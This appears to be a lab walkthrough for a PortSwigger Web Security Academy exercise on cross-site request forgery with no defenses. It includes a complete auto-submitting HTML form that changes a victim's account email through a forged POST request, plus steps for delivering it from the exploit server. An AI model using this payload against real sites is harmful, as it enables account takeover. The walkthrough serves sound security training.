# Lab: CSRF vulnerability with no defenses

**Link**: https://portswigger.net/web-security/csrf/lab-no-defenses

**Solution**:

1- in My account page, try accessing to change the email tab,

2- Intercept the request with Burp like the following

<p align="center" width="100%">
  <img src="https://github.com/aboelkassem/portswigger-labs/blob/main/CSRF/Lab%20CSRF%20vulnerability%20with%20no%20defenses/image1.png" width="500" hight="500"/>
</p>

3- there is no token authorize per form generation

4- so, we can generate html with `/my-account/change-email` post method like the following 

5- or in burp pro, right-click on the request ⇒ Engagement tools ⇒ generate CSRF PoC (which will generate the following html)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a5c00f3042ae730c010b344005500e0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="mohamed&#46;abdelrahman&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

6- In port swagger, open Exploit server

7- Past the above code in Body, then Store

8- Click on deliver to victom

<p align="center" width="100%">
  <img src="https://github.com/aboelkassem/portswigger-labs/blob/main/CSRF/Lab%20CSRF%20vulnerability%20with%20no%20defenses/image2.png" width="500" hight="500"/>
</p>
